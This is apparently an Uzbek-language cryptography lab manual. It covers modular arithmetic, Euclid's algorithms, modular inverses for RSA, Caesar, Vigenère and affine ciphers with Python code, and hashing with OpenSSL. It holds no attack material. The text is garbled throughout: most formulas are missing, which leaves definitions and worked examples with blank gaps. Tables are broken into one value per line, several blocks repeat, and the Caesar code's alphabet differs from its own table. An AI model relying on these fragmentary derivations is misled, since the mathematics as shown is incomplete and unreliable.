+Butun  va  sonlari modul  bo‘ycha taqqoslanadigan deyiladi, agarda ularni n ga bo‘lganda qoladigan qoldiqlari teng bo‘lsa, hamda,  deb yoziladi. Bundan esa va  sonlar ayirmasining  ga qoldiqsiz bo‘linishi kelib chiqadi.
+Qoldiqni ifodalash uchun ushbu tenglikdan foydalaniladi, hamda  tenglikni qanoatlantiruvchi sonini topishsonini modul  bo‘yicha keltirish deyiladi.
+Biror  modul bo‘yicha qo‘shish, ayirish va ko‘paytirish amallariga nisbatan quyidagi kommutativlik, assotsiativlik va distributivlik munosabatlari o‘rinli:
+
+
+
+
+Quyida modul amallari bilan bog‘liq bir nechta misollar keltirib o‘tilgan:
+	•	 tenglikda bo‘lgan holda, natijani hisoblash uchun  ni  ga bo‘lib, qoldig‘i olinadi. Masalan, 
+	•	tenglikda  va  bo‘lgan holda, a ga toki yig‘inda noldan katta bo‘lguncha  qo‘shiladi. Masalan, ; ;
+	•	 tenglikda kasr son bo‘lgan holda, tenglik quyidagi  tenglikka keltiriladi.  ga teng bo‘lsa,  butun son bo‘ladi. Olingan tenglikdan  ning o‘rniga qiymat berish orqali tenglik bajaralishi tekshiriladi. Tenglik bajarilsa, unda  ga o‘zlashtiriladi. Bu usul ko‘p vaqt talab etadi. Shuning uchun amalda Evklidning kengaytirilgan algoritmining xususiy holidan foydalaniladi.
+ qoldiqni hisoblashning effektiv usuli. RSA, El-Gamal  asimmetrik kriptotizimlarda ma’lumotlarni shifrlash, deshifrlash va bu shifrlash algoritmlari bilan bog‘liq bo‘lgan boshqa parametrlarni hisoblash uchun  taqqoslamani hisoblashga to‘g‘ri keladi. Agar berilgan , ,  sonlar katta razryadli sonlardan iborat bo‘lsa,  taqqoslamani hisoblash masalasi hatto eng zamonaviy kompyuterlarda ham ancha mushkul hisoblanadi. Shu maqsadda bunday taqqoslamalarni hisoblashning effektiv usullarini bilish muhimdir. Shunday algoritmlardan biri haqida to‘xtalib o‘tamiz.
+Algoritm quyidagi qadamlardan iborat:
+1-qadam.  soni ikkilik sanoq sistemasiga o‘tkaziladi:
+2
+bu yerda, yoki   va .
+2-qadam.   qiymatni yuklaymiz.
+3-qadam. Barcha   va  qiymatlar uchun 
+    	
+4-qadam. 3-qadamning oxirgi natijasi  biz qidirayotgan yechim deb e’lon qilinadi.
+1-misol.    – qoldiqni hisoblang.
+Yechish:  , bu sonni ikkilik sanoq sistemasiga o‘tkazamiz:
+	
+Ya’ni,  , 
+Demak, algoritm qadamiga muvofiq:
+					, 
+Qiymatlar quyidagi qoida bo‘yicha hisoblanadi:
+                                                                                                                     
+
+Javob: 
+Evklid algoritmi. Asimmetrik kriptotizimlar zarur parametrlarni topish va tanlashda ikkita sonning eng katta umumiy bo‘luvchisini topish masalasi bilan to‘qnash kelamiz. Masalan RSA, El-Gamal  algoritmlari uchun ,  -tub sonlari, -parametr va boshqalar. Ana shu maqsadda, bu ishni amalga oshiruvchi algoritm haqida fikr yuritamiz.
+ Ikkita natural sonning EKUB – ni topishda Evklid algoritmi deb ataluvchi usuldan foydalaniladi. Bu algoritm qadamlari esa quyidagicha:
+	•	 bo‘lsa, .
+	•	Agar  bo‘lib, masalan  bo‘lsa, u holda  soni  soniga bo‘linadi:
+,     b                                           (1)
+bunda  bo‘lsa, algoritm o‘z ishini to‘xtatib,  bo‘ladi. 
+Agarda   bo‘lsa, algoritm o‘z ishini davom ettiradi.
+3.  soni  ga bo‘linadi:
+ ,                                                             
+ bunda  bo‘lsa, algoritm o‘z ishini to‘xtatib,  bo‘ladi. Agarda   bo‘lsa, algoritm o‘z ishini davom ettiradi.
+	4.  qoldiq   ga bo‘linadi:
+	,                                         
+Ushbu jarayon chekli qadamdan so‘ng tugaydi, chunki … lardan ko‘rinadiki:
+	 
+shartlarni qanoatlantiradi, bu degani esa chekli “k” qadamdan so‘ng  bo‘ladi.
+Shunda algoritm o‘z ishini tugatib,   deb e’lon qilinadi
+ 2-misol. ,  sonlarining topilsin.
+Yechish. Dastlabki sistema  juftlikdir., bo‘lgani uchun algoritmning birinchi qadami:  ,   .
+Sonlarning keyingi sistemasi:  bo‘ladi va qoldiq  bo‘lgani uchun ikkinchi qadami:
+,   natijada miqdorlarning uchinchi sistemasi  hosil bo‘ladi,  bo‘lgani uchun algoritmning uchinchi qadami:
+ natijada miqdorlarning to‘rtinchi sistemasi hosil bo‘ladi. 
+Nihoyat  bo‘lgani uchun algoritmning to‘rtinchi qadami boshlanadi:
+, bu yerda qoldik nol chiqdi, natijada miqdorlarnig oxirgi sistemasi hosil bo‘ladi:  
+Bu jarayonlarni shartli ravishda quyidagicha ifodalash mumkin:
+
+Demak, .
+Kengaytirlgan Evklid algoritmi. Kengaytirlgan Evklid algoritmi RSA kriptotizimi ochiq kaliti  ni topishda  taqqoslama tenglamaga duch kelinib, uni yechish bevosita ,   tenglama butun yechimlarini topish masalasiga ekvivalent hamda bu algoritmga ko‘ra berilgan  soniga  bo‘yicha teskari elementni topish imkonini beradi. Shuning uchun ham bu algoritm ishlash prinsiplarini keltirib o‘tamiz.
+Teorema. Aytaylik,  va natural sonlar,  bo‘lsin. U holda shunday   va  butun sonlar topiladiki 
+			 
+tenglik o‘rinli bo‘ladi.
+Demak, bu algoritm nafaqat ikkita natural sonning ni, balki yoyilmadagi  va  koeffisentlarni ham topish imkonini berar ekan. Ushbu algoritm shunisi bilan ham asl Evklid algoritmidan farqlanadi.
+Kengaytirilgan Evklid algoritmiga muvofiq topiladigan   va   butun sonlar, quyidagi Diafant tenglamasi 
+			 
+butun yechimlari hisoblanadi. Bu esa esa bizga RSA algoritmi ochiq va maxfiy kalitlarini topish imkonini yaratadi. Shu sababli bu algoritm ishlash qadamlari bilan yaqindan tanishib chiqamiz va misollarga qo‘llab ko‘rsatamiz.
+ Faraz qilaylik,   va  sonlarning  ni topishda quyidagi ketma-ketlik qaralayotgan bo‘lsin:
+		,        r1= ax1 + b y1;
+		        r2= ax2+ by2;
+		      r 3= ax3+ b y3;
+  		……………….   ………………..
+		    
+		           
+Biz, bu yerda 
+           va 
+sonlarini topishimiz kerak. Bu sonlar quyidagi formula yordamida topiladi:
+		 va  
+bu yerda
+                      
+Kerakli ma’lumotlarni quyidagi jadval orqali berish mumkin:
+qoldiqlar
+bo‘luvchi
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Jadvalda keltirilgan oxirgi ustundagi ikki qiymat biz izlayotgan alfa va betta koeffisentlardir, ya’ni   teng bo‘ladi.
+3-misol. Evklid algoritmini qo‘llab   va , - qiymatlar topilsin.
+Evklid algoritmi qadamlariga muvofiq:
+            ,  ya’ni  
+            , ya’ni 
+             , ya’ni  
+             , ya’ni  
+             , ya’ni  
+             , ya’ni 
+demak, 
+            
+soni 6188 va 4709 sonlarining i deb e’lon qilinadi, ya’ni    
+            .    
+Kengaytirilgan Evklid algoritmiga ko‘ra:
+                =?, =?     topaylik:
+yuqorida keltirilgan ifodani quyidagicha yozib olamiz:
+       
+        
+        
+       
+        
+yoki:
+ , 
+ya’ni 
+         ;  demak,  =121; = - 159
+Javob:    =121, = - 159.
+Berilgan modul buyicha teskari elementni topish. RSA shifrlash algoritmi uchun ochiq kalit “e” soni d –soniga modul(n) bo‘yicha teskari son hisoblanadi.Bu son bizga shu algoritmning 4-qadamini amalga oshirish uchun zarur bo‘ladi. Bu elementni aniqlash usullari haqida muhim tushunchalarni berib o‘tamiz. El-Gamal algoritmi qadamlarida esa bu elementga murojat qilinmaydi.
+Ta’rif. Agar  va n butun sonlar o‘zaro tub bo‘lsa, shunday a’ son mavjud bo‘lib, 
+		
+taqqoslama o‘rinli buladi. 
+Bu yerda,  son, -ga modul n bo‘yicha teskari (element)son deyiladi  va   kabi belgilanadi. Uni hisoblash Eyler funksiyasi yordamida va kengaytirilgan Evklid algoritmidan foydalangan holda amalga oshiriladi.
+4-misol.   ,  bo‘lsa, 
+		
+bo‘ladi. U holda shunday  son mavjud bo‘lib,   tenglik o‘rinli bo‘ladi. Demak,  -ni topish kerak.
+Bu misolni kengaytirilgan Evklid algoritmi yordamida yechishni ko‘rib chiqamiz.
+Berilgan misolga ko‘ra :
+
+
+
+ qoldiq nol bo‘lgandan oldingi qoldiqdan boshlab teskarisiga qaytsak:
+  va   ekanligini e’tiborga olsak,
+  ifodani quyidagicha yozishimiz mumkin:
+
+ya’ni  , bu yerda  ,   , ,  (kengaytirilgan Evklid algoritmi uchun). 
+Shunday qilib, biz qidirayotgan  son esa quyidagiga teng bo‘ladi:
+	
+Javob:  
+Har bir algoritmni dasturiy ko‘rinishda ifodalash
+1. Agar bizdan -36mod89 qoldiqni hisoblash talab etilgan bo‘lsin. U holda ushbu qiymatni hisoblash uchun Python dasturlash tilida uning dasturini tuzamiz va natijani olamiz (4.1-rasm). Dastur kodi quyidagicha:
+def qoldiq_top(a,n):
+    «««a va n qiymatini qabul qilib,a ni n ga bo‘lgandagi qoldiqni topish funksiyasi»««
+    return a%n
+a = int(input(«a sonini kiriting: «))
+n = int(input(«n sonini kiriting: «))
+b = qoldiq_top(a,n)
+print(b)
+Ushbu kodni ishlatish uchun ixtiyoriy brauzerni ochib https://www.programiz.com/python-programming/online-compiler/ manzilga kirib kodni tashlab natijani tekshirish mumkin.
+Natijaga qarasak -36mod89=53 bo‘lar ekan.
+
+4.1-rasm. Dasturdan olingan natija
+2. Agar bizdan ,  berilgan bo‘lib,  ni hisoblash talab etilgan bo‘lsin. U holda  ni topish uchun Python dasturlash tilida uning dasturini tuzamiz va natijani olamiz (4.2-rasm). Dastur kodi quyidagicha:
+def d_top(e,n):
+    «««d topuvchi funksiya»««
+    sonlar = []
+    son = 1
+    while son < n:
+        if (son*e)%n == 1:
+            sonlar.append(son)
+        son += 1
+    return sonlar        
+e = int(input(«e ni qiymatini kiriting: «))
+n = int(input(«n ni qiymatini kiriting: «))
+sonlar = d_top(e,n)
+for son in sonlar:
+    print(son)
+Natijaga qarasak  ekan, ya’ni 29 ni 4 ga ko‘paytirib 5 ga bo‘lsak qoldiq 1 chiqar ekan.
+
+4.2-rasm. Dasturdan olingan natija
+3. Agar bizdan ,  qiymatlar berilib, qoldiqni hisoblashning effektiv usulidan foydalanib  ni hisoblash talab etilgan bo‘lsin. U holda ushbu qiymatlarni hisoblash uchun Python dasturlash tilida uning dasturini tuzamiz va natijani olamiz (4.3-rasm). Dastur kodi quyidagicha:
+a = int(input(«a sonini kiriting: «))
+e = int(input(«e sonini kiriting: «))
+n = int(input(«n sonini kiriting: «))
+ikkilik = ««
+while True :
+   if e%2 == 0 :
+       ikkilik += «0»
+   else :
+       ikkilik += «1»
+   e = e//2
+   if e == 1 :
+       ikkilik +=«1»
+       break
+uzunlik = len(ikkilik)-2
+p = a%n
+while uzunlik>=0 :
+    if ikkilik[uzunlik] == «1»:
+        p = (p**2*a)%n
+    else :
+        p = p**2%n
+    uzunlik -= 1
+print(p)
+Natijaga qarasak 15547 mod 37 = 35 chiqar ekan.
+
+4.3-rasm. Dastur natijasi
+
+		Laboratoriya muhitida tub sonlarni generatsiya qiling va modul bo‘yicha teskarisini hisoblang.
+	•	Sonning moduli, Evklid algoritmlari va berilgan modul bo‘yicha teskari elementni topishga oid misollarni yeching.
+	•	Barcha olingan natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida tub sonlarni generatsiya qiling va modul bo‘yicha teskarisini hisoblang.
+	•	Sonning moduli, Evklid algoritmlari va berilgan modul bo‘yicha teskari elementni topishga oid misollarni yeching.
+	•	Barcha olingan natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+4.2. Simmetrik va ochiq kalitli shifrlash algoritmlari
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda sodda shifrlarni ishlashi bo‘yicha ko‘nikmalarni shakllantirishdan iborat.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda sodda shifrlarni ishlashi bo‘yicha ko‘nikmalarni shakllantirishdan iborat.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Python dasturlash muhiti;
+	•	Brauzer oynasi.
+
+	•	Shaxsiy kompyuter;
+	•	Python dasturlash muhiti;
+	•	Brauzer oynasi.
+
+Ishning bajarish tartibi
+Sezar shifri — bu alifbo asosida o‘rniga qo‘yish shifrlaridan biri. Har bir harf alifbodagi ma’lum sonli pozitsiyaga siljitiladi. Klassik misolda Yuliy Sezar o‘z xabarlarini har bir harfni 3 pozitsiya oldinga siljitish orqali shifrlagan.
+Matematik ifoda:
+	•	Alifbo elementlarini 0 … (N−1) oralig‘ida indekslaymiz (N - alifbo uzunligi).
+	•	Harfning indeksini  deb olsak, shifrlash:
+bu yerda — siljitish kaliti.
+Deshifrlash:
+
+Masalan: Ingliz alifbosi (N = 26). Agar A=0, B=1,... Z=25 va , unda:
+	•	A → D (0+3 = 3 → D)
+	•	X → A (23+3 = 26 → 26 mod 26 = 0 → A)
+O‘zbek alifbosi yoki kirill/lotin bo‘lishiga qarab N o‘zgaradi (o‘zbek lug‘atida N = 29 bo‘lishi mumkin, tanlangan alifboga eʼtibor bering).
+Sezar usulida axborotni shifrlash. Alfavitni yozib olamiz va tartib raqamlar bilan belgilaymiz.
+
+
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+U
+V
+W
+X
+Y
+Z
+‘
+_
+.
+,
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+Kalitni K=5  deb belgilaymiz.
+Ochiq matn= MIRZAYEV_JAMSHID
+Ochiq matn
+M
+I
+R
+Z
+A
+Y
+E
+V
+_
+J
+A
+M
+S
+H
+I
+D
+T/R
+13
+9
+18
+26
+1
+25
+5
+22
+28
+10
+1
+13
+19
+8
+9
+4
+T/R+K
+18
+14
+23
+1
+6
+30
+10
+27
+3
+15
+6
+18
+24
+13
+14
+9
+Shifrmatn
+R
+N
+W
+A
+F
+,
+J
+‘
+C
+O
+F
+R
+X
+M
+N
+I
+Shifr matn= RNWAF,J’COFRXMNI
+Endi shifr matnni ochiq matnga akslantiramiz.
+Qabul qiluvchi shifr matn RNWAF,J’COFRXMNI ni oladi. Qabul qiluvchi alfavit tarbini va K=5 kalitni ham bilishi kerak.
+Shifr matn
+R
+N
+W
+A
+F
+,
+J
+‘
+C
+O
+F
+R
+X
+M
+N
+I
+T/R
+18
+14
+23
+1
+6
+30
+10
+27
+3
+15
+6
+18
+24
+13
+14
+9
+T/R-K
+13
+9
+18
+26
+1
+25
+5
+22
+28
+10
+1
+13
+19
+8
+9
+4
+Ochiq matn
+M
+I
+R
+Z
+A
+Y
+E
+V
+_
+J
+A
+M
+S
+H
+I
+D
+Yuqorida ko‘rgan misolimizni endi Python dasturlash muhitida kodini yozib tekshirib ko‘ramiz. Dastur kodi quyidagicha:
+# ----- Sezar shifri: interaktiv dastur -----
+ALPHABET = «ABCDEFGHIJKLMNOPQRSTUVWXYZ’_*,»
+def caesar_encrypt(text, k):
+    text = text.upper()
+    result = ««
+    for ch in text:
+        if ch in ALPHABET:
+            old_index = ALPHABET.index(ch)
+            new_index = (old_index + k) % len(ALPHABET)
+            result += ALPHABET[new_index]
+        else:
+            result += ch
+    return result
+def caesar_decrypt(text, k):
+    return caesar_encrypt(text, -k)
+# ----- Asosiy menyu -----
+print(«=== Sezar shifri dasturi ===«)
+print(«1. Shifrlash»)
+print(«2. Deshifrlash»)
+print(«============================«)
+choice = input(«Tanlang (1 yoki 2): «).strip()
+# Tanlov noto‘g‘ri bo‘lsa
+if choice not in [«1», «2»]:
+    print(«Xato tanlov! Dasturni qaytadan ishga tushiring.»)
+    exit()
+# Kalit so‘rash
+try:
+    k = int(input(«Kalitni kiriting (k): «))
+except ValueError:
+    print(«Kalit faqat butun son bo‘lishi kerak!»)
+    exit()
+# Matn kiritish
+text = input(«Matnni kiriting: «)
+# Tanlov bo‘yicha bajarish
+if choice == «1»:
+    result = caesar_encrypt(text, k)
+    print(«\nShifrlangan matn:», result)
+elif choice == «2»:
+    result = caesar_decrypt(text, k)
+    print(«\nDeshifrlangan matn:», result)
+Ushbu kodni ishlatish uchun ixtiyoriy brauzerni ochib https://www.programiz.com/python-programming/online-compiler/ manzilga kirib kodni tashlab natijani tekshirish mumkin.
+
+4.4-rasm. Dastur ko‘rinishida shifrlash jarayoni
+
+4.5-rasm. Dastur ko‘rinishida deshifrlash jarayoni
+Vijener usulida axborotni shifrlash. Alfavitni belgilab olamiz.
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+‘
+_
+.
+,
+Maxfiy kalit sifatida Kalit=TALABA deb olamiz.
+Ochiq matn sifatida Ochiq matn= KOMPYUTER
+
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+‘
+_
+.
+,
+T
+U
+V
+W
+X
+Y
+Z
+‘
+_
+.
+,
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+‘
+_
+.
+,
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+‘
+_
+.
+,
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+‘
+_
+.
+,
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+‘
+_
+.
+,
+A
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+‘
+_
+.
+,
+Vijiner usuliga ko‘ra alfavitni kalit ustuniga ko‘ra joylashtirib chiqamiz:
+Ochiq matnni jadvalga yozib kalit ochiq matn pastki qismiga mos holda joylashtirib chiqamiz.
+K
+O
+M
+P
+Y
+U
+T
+E
+R
+T
+A
+L
+A
+B
+A
+T
+A
+L
+,
+O
+X
+P
+Z
+U
+I
+E
+.
+Jadvaldan foydalanib ochiq matn belgilarni ustun bo‘yicha kalit belgilarini qator bo‘yicha kesishmasidagi belgini birma-bir yozib chiqamiz.
+Belgilarni jamlab shirf matnni hosil qilamiz.
+Shifr matn = ,OXPZUIE.
+Yuqorida ko‘rgan misolni endi Python dasturlash muhitida kodini yozib tekshirib ko‘ramiz. Dastur kodi quyidagicha:
+# Maxsus alifbo
+ALPHABET = «ABCDEFGHIJKLMNOPQRSTUVWXYZ’_*,»
+def vigenere_encrypt(plain_text, key):
+    plain_text = plain_text.upper()
+    key = key.upper()
+    result = ««
+    key_index = 0
+    for char in plain_text:
+        if char in ALPHABET:
+            shift = ALPHABET.index(key[key_index % len(key)])
+            new_char = ALPHABET[(ALPHABET.index(char) + shift) % len(ALPHABET)]
+            result += new_char
+            key_index += 1
+        else:
+            result += char   # Alifboga kirmasa o‘zgarmaydi
+    return result
+def vigenere_decrypt(cipher_text, key):
+    cipher_text = cipher_text.upper()
+    key = key.upper()
+    result = ««
+    key_index = 0
+    for char in cipher_text:
+        if char in ALPHABET:
+            shift = ALPHABET.index(key[key_index % len(key)])
+            new_char = ALPHABET[(ALPHABET.index(char) - shift) % len(ALPHABET)]
+            result += new_char
+            key_index += 1
+        else:
+            result += char
+    return result
+# ======== Interaktiv dastur ========
+print(«=== VIJENER SHIFRLASH DASTURI ===«)
+print(«Ishlatilayotgan alifbo:», ALPHABET)
+print(«Belgilar soni:», len(ALPHABET))
+print(«----------------------------------»)
+print(«1. Shifrlash»)
+print(«2. Deshifrlash»)
+tanlov = input(«Tanlang (1 yoki 2): «)
+key = input(«Kalitni kiriting: «)
+matn = input(«Matnni kiriting: «)
+print(«\nNatija:»)
+if tanlov == «1»:
+    print(«Shifrlangan matn:», vigenere_encrypt(matn, key))
+elif tanlov == «2»:
+    print(«Deshifrlangan matn:», vigenere_decrypt(matn, key))
+else:
+    print(«Noto‘g‘ri tanlov!»)
+Ushbu kodni ishlatish uchun ixtiyoriy brauzerni ochib https://www.programiz.com/python-programming/online-compiler/ manzilga kirib kodni tashlab natijani tekshirish mumkin.
+
+4.6-rasm. Dastur ko‘rinishida shifrlash jarayoni
+
+4.7-rasm. Dastur ko‘rinishida deshifrlash jarayoni
+Affin shifrlash usuli. Affin tizimidagi Sezar usulida har bir harfga almashtiriluvchi harflar maxsus formula bo‘yicha aniqlanadi: , bu yerda ,  - butun sonlar bo‘lib, kalitlar hisoblanadi, , .  – alifbo uzunligi.
+Deshifrlash jarayoni quyidagi formula asosida amalga oshiriladi: 
+. Bu yerda,  bo‘yicha  ga teskari bo‘lgan son.
+Lotin alifbosidan foydalanilganda harflarning raqamlanishi
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+Shifrlash. Ushbu usulda ma’lumotlarni shifrlash uchun “ATTACK AT DAWN” ochiq matni olinib, kalit sifatida  va  olindi. Alifbo uzunligi  ga teng. Bu holda shifrlash funksifsining umumiy ko‘rinishi quyidagicha bo‘ladi: . Yuqoridagi jadvalga asoslanib quyidagini olish mumkin:
+Xabar
+A
+T
+T
+A
+C
+K
+A
+T
+D
+A
+W
+N
+
+0
+19
+19
+0
+2
+10
+0
+19
+3
+0
+22
+13
+Shifrlashning umumiy ko‘rinishi esa quyidagicha bo‘ladi:
+Xabar
+A
+T
+T
+A
+C
+K
+A
+T
+D
+A
+W
+N
+
+0
+19
+19
+0
+2
+10
+0
+19
+3
+0
+22
+13
+
+4
+61
+61
+4
+10
+34
+4
+61
+13
+4
+70
+43
+
+4
+9
+9
+4
+10
+8
+4
+9
+13
+4
+18
+17
+Shifr matn, 
+E
+J
+J
+E
+K
+I
+E
+J
+N
+E
+S
+R
+Deshifrlash formulasi  ga teng bo‘lib, ,  va  ga teng bo‘ladi.
+Shifrmatn
+E
+J
+J
+E
+K
+I
+E
+J
+N
+E
+S
+R
+
+4
+9
+9
+4
+10
+8
+4
+9
+13
+4
+18
+17
+
+0
+45
+45
+0
+54
+36
+0
+45
+81
+0
+126
+117
+
+0
+19
+19
+0
+2
+10
+0
+19
+3
+0
+22
+13
+Xabar, 
+A
+T
+T
+A
+C
+K
+A
+T
+D
+A
+W
+N
+Yuqorida ko‘rgan misolimizni endi Python dasturlash muhitida kodini yozib tekshirib ko‘ramiz. Dastur kodi quyidagicha:
+# Maxsus alifbo
+ALPHABET = «ABCDEFGHIJKLMNOPQRSTUVWXYZ»
+ALPHABET_LEN = len(ALPHABET)
+
+def mod_inverse(a, m):
+    «««a ning modul bo‘yicha teskari sonini topish»««
+    for x in range(1, m):
+        if (a * x) % m == 1:
+            return x
+    return None
+
+def affine_encrypt(plain_text, a, b):
+    plain_text = plain_text.upper()
+    result = ««
+    for char in plain_text:
+        if char in ALPHABET:
+            idx = ALPHABET.index(char)
+            new_idx = (a * idx + b) % ALPHABET_LEN
+            result += ALPHABET[new_idx]
+        else:
+            result += char
+    return result
+
+def affine_decrypt(cipher_text, a, b):
+    cipher_text = cipher_text.upper()
+    a_inv = mod_inverse(a, ALPHABET_LEN)
+    if a_inv is None:
+        return «Xato: a va alifbo uzunligi tub bo‘lishi kerak!»
+    result = ««
+    for char in cipher_text:
+        if char in ALPHABET:
+            idx = ALPHABET.index(char)
+            new_idx = (a_inv * (idx - b)) % ALPHABET_LEN
+            result += ALPHABET[new_idx]
+        else:
+            result += char
+    return result
+
+# ======== Interaktiv dastur ========
+print(«=== AFFIN SHIFRLASH DASTURI ===«)
+print(«Ishlatilayotgan alifbo:», ALPHABET)
+print(«Belgilar soni:», ALPHABET_LEN)
+print(«----------------------------------»)
+print(«1. Shifrlash»)
+print(«2. Deshifrlash»)
+
+tanlov = input(«Tanlang (1 yoki 2): «)
+
+try:
+    a = int(input(«Multiplikativ kalit a ni kiriting (a va alifbo uzunligi tub bo‘lishi kerak): «))
+    b = int(input(«Additiv kalit b ni kiriting: «))
+except ValueError:
+    print(«Xato: Kalitlar butun son bo‘lishi kerak!»)
+    exit()
+matn = input(«Matnni kiriting: «)
+print(«\nNatija:»)
+if tanlov == «1»:
+    print(«Shifrlangan matn:», affine_encrypt(matn, a, b))
+elif tanlov == «2»:
+    print(«Deshifrlangan matn:», affine_decrypt(matn, a, b))
+else:
+    print(«Noto‘g‘ri tanlov!»)
+Ushbu kodni ishlatish uchun ixtiyoriy brauzerni ochib https://www.programiz.com/python-programming/online-compiler/ manzilga kirib kodni tashlab natijani tekshirish mumkin.
+
+4.8-rasm. Dastur ko‘rinishida shifrlash jarayoni
+
+4.9-rasm. Dastur ko‘rinishida deshifrlash jarayoni
+
+		Laboratoriya muhitida Sezar shifrini Python dasturlash tilida amalga oshiring va k=9 uchun shifrlash/ deshifrlashni bajaring.
+	•	Affin shifrlash usulida o‘z ismingizni shifrlang va deshifrlang natijangizni dastur ko‘rinishida tekshiring: a=7, b=12.
+	•	Barcha olingan natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida Sezar shifrini Python dasturlash tilida amalga oshiring va k=9 uchun shifrlash/ deshifrlashni bajaring.
+	•	Affin shifrlash usulida o‘z ismingizni shifrlang va deshifrlang natijangizni dastur ko‘rinishida tekshiring: a=7, b=12.
+	•	Barcha olingan natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+
+4.3. Xesh funksiyalar
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda fayllarni xeshlash va yaxlitligini tekshirish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda fayllarni xeshlash va yaxlitligini tekshirish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Terminal oynasi;
+	•	OpenSSL kutubxonasi.
+
+	•	Shaxsiy kompyuter;
+	•	Terminal oynasi;
+	•	OpenSSL kutubxonasi.
+
+Ishning bajarish tartibi
+Fayllarni xeshlash ma’lumotlarning yaxlitligini (integrity) tekshirish uchun ishlatiladi. Xesh funksiyasi (masalan, MD5, SHA-256) fayl mazmunidan noyob “xesh qiymat” (hash value) hosil qiladi. Agar fayl o‘zgarsa, xesh qiymati o‘zgaradi. Ushbu laboratoriya ishida Windows 10/11 OTda OpenSSL yordamida fayllarni xeshlash va yaxlitligini tekshirish ko‘rib chiqiladi.
+Windows OTda OpenSSLni o‘rnatish va ishga tushurish. Buning uchun rasmiy saytdan dasturni Lite versiyasini yuklab oling va o‘rnating (4.10-rasm) (https://slproweb.com/products/Win32OpenSSL.html), o‘rnatishda “Add OpenSSL to PATH” bandini belgilang.
+
+4.10-rasm. OpenSSLni o‘rnatish
+Dasturdan foydalanishda qulaylik yaratish uchun C diskda “Xesh” degan papka yaratib olamiz va dasturni shu papka ichida ishga tushuramiz (4.11-rasm).
+
+4.11-rasm. Kerakli papkani yaratib olish
+Openssl kutubxonasidan foydalanish uchun cmd buyrug‘idan foydalaniladi 
+4.12-rasm. Cmd buyrug‘ini ishga tushirish
+(ПУСК va R tugmalari birgalikda bosiladi):
+Cmd oynasidagi joriy papkasidan chiqish uchun cd.. buyrug‘idan foydalaniladi:
+
+4.13-rasm. cd.. buyrug‘idan foydalanish
+Openssl kutubxonasi uchun foydalanadigan Xesh papkasiga cd Xesh buyrug‘i orqali kiriladi va echo buyrug‘i orqali ochiq ma’lumot va fayl hosil qilinadi:
+
+4.14-rasm. Ochiq ma’lumot hosil qilish
+Hosil qilingan matn.txt fayli yaratilgan Xesh papkani ichiga tushadi.
+
+4.15-rasm. Ochiq ma’lumot joylashuvi va mazmuni
+Dasturni ishga tushurish uchun quyidagi buyruq kiritiladi (4.16-rasm):
+
+4.16-rasm. OpenSSLni ishga tushirish
+Ma’lumotni xesh qiymatini hisoblash uchun dgst buyrug‘idan foydalanamiz. 4.17-rasmda MD5, SHA256 va SHA512 xesh funksiyalardan foydalanib matn.txt fayldagi ma’lumotni xesh qiymatlari hosil qilingan.
+
+4.17-rasm. Opensslda xesh qiymatni hisoblash 
+Endi ma’lumotni yaxlitligini tekshirib ko‘rish uchun matn.txt fayldagi ma’lumotga o‘zgartirish kiritib (4.18-rasm), qaytadan xesh qiymatni hisoblab ko‘ramiz. Agar xesh qiymat farq qilsa demak ma’lumot yaxlitligi buzilgan hisoblanadi (4.19-rasm).
+
+4.18-rasm. Ma’lumotga o‘zgartirish kiritish
+
+4.19-rasm. Xesh qiymatlarni solishtirish
